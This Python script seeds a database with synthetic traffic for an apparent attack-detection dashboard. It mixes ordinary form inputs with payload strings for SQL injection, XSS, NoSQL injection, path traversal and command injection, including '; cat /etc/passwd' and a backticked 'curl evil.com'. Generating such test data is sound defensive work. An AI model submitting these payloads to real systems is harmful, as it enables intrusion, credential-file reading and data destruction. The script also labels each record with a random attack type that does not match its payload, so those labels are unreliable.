from datetime import datetime, timedelta
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from zoneinfo import ZoneInfo
import random
from enum import Enum
from typing import List

# Assuming your models are in a file called models.py
from models import Base, TextMessage, Customer

DATABASE_URL = "postgresql://user:password@localhost/dbname"
engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

class AttackType(str, Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    CSRF = "csrf"
    LFI = "local_file_inclusion"
    RFI = "remote_file_inclusion"
    XXE_INJECTION = "xxe_injection"
    SSRF = "ssrf"
    LDAP_INJECTION = "ldap_injection"
    CODE_INJECTION = "code_injection"
    DOS = "denial_of_service"
    BUFFER_OVERFLOW = "buffer_overflow"
    HTTP_HEADER_INJECTION = "http_header_injection"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    SESSION_FIXATION = "session_fixation"
    CLICKJACKING = "clickjacking"
    PHISHING = "phishing"
    NORMAL = "normal"
    UNKNOWN = "unknown"

class AttackPatterns:
    SQL_INJECTION = [
        "' OR '1'='1",
        "UNION SELECT * FROM users",
        "1'; DROP TABLE users--",
        "admin'--",
        "' OR '1'='1' /*",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL--",
        "1 OR 1=1",
        "1' AND 1=(SELECT COUNT(*) FROM tabname); --",
    ]

    XSS = [
        "<script>alert('xss')</script>",
        "<img src='x' onerror='alert(1)'>",
        "javascript:alert(1)",
        "<svg/onload=alert(1)>",
        "'-alert(1)-'",
    ]

    NOSQL_INJECTION = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "sleep(1000)"}',
        '{"password": {"$regex": "^a"}}',
    ]

    COMMAND_INJECTION = [
        "; cat /etc/passwd",
        "|| dir",
        "& ping -i 30 127.0.0.1 &",
        "`curl evil.com`",
    ]

    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f",
        "....//....//etc/passwd",
    ]

def generate_legitimate_input():
    """Generate realistic non-malicious form inputs"""
    usernames = [
        "john.doe", "sarah.smith", "tech_lover92", "mountain_hiker",
        "coffee_addict", "python_dev", "web_designer", "data_wizard",
        "photo_enthusiast", "music_lover_23"
    ]

    email_domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "proton.me"]

    comments = [
        "Great product! Would recommend.",
        "When will this be back in stock?",
        "How can I contact support?",
        "Please update my shipping address.",
        "Thanks for the quick delivery!",
    ]

    form_types = [
        ("username", lambda: random.choice(usernames)),
        ("email", lambda: f"{random.choice(usernames)}@{random.choice(email_domains)}"),
        ("comment", lambda: random.choice(comments)),
    ]

    input_type, generator = random.choice(form_types)
    return generator(), input_type

def create_sample_messages(num_messages: int, domain: str) -> List[TextMessage]:
    messages = []

    # IP ranges for random IPs
    ip_ranges = [
        "192.168.1.", "10.0.0.", "172.16.0.",
        "203.0.113.", "198.51.100.", "45.33.22.",
        "156.78.12.", "89.234.56.", "212.44.12."
    ]

    # Define attack types and their patterns
    attack_patterns = {
        "sql_injection": AttackPatterns.SQL_INJECTION,
        "xss": AttackPatterns.XSS,
        "nosql_injection": AttackPatterns.NOSQL_INJECTION,
        "command_injection": AttackPatterns.COMMAND_INJECTION,
        "path_traversal": AttackPatterns.PATH_TRAVERSAL
    }

    # Generate messages with timestamps spanning the last 24 hours
    end_time = datetime.now(ZoneInfo("UTC"))
    start_time = end_time - timedelta(hours=24)

    for _ in range(num_messages):
        # 70% legitimate traffic, 30% attacks
        is_attack = random.random() < 0.3

        if is_attack:
            # Choose random attack type and pattern
            attack_type = random.choice(list(attack_patterns.keys()))
            message_text = random.choice(attack_patterns[attack_type])
            is_malicious = True
            # 80% chance of blocking malicious traffic
            caused_block = random.random() < 0.8
        else:
            # Generate legitimate form input
            message_text, input_type = generate_legitimate_input()
            is_malicious = False
            caused_block = False

        # Generate random timestamp within the last 24 hours
        random_seconds = random.randint(0, int((end_time - start_time).total_seconds()))
        timestamp = start_time + timedelta(seconds=random_seconds)

        # Generate random IP
        ip = f"{random.choice(ip_ranges)}{random.randint(1, 254)}"

        message = TextMessage(
            domain=domain,
            ip_address=ip,
            message=message_text,
            type=random.choice(list(AttackType)).value,
            is_malicious=is_malicious,
            caused_block=caused_block,
            created_at=timestamp,
            blocked_at=timestamp if caused_block else None
        )

        messages.append(message)

    return messages

def seed_database():
    db = SessionLocal()
    try:
        # First, ensure we have a test customer
        test_customer = Customer(
            domain="example.com",
        )

        # Add customer if it doesn't exist
        existing_customer = db.query(Customer).filter_by(domain="example.com").first()
        if not existing_customer:
            db.add(test_customer)
            db.commit()

        # Generate and add sample messages
        messages = create_sample_messages(1000, "example.com")  # Create 1000 sample messages
        db.bulk_save_objects(messages)
        db.commit()

        print(f"Successfully seeded database with {len(messages)} messages")

    except Exception as e:
        print(f"Error seeding database: {e}")
        db.rollback()
    finally:
        db.close()

if __name__ == "__main__":
    seed_database()
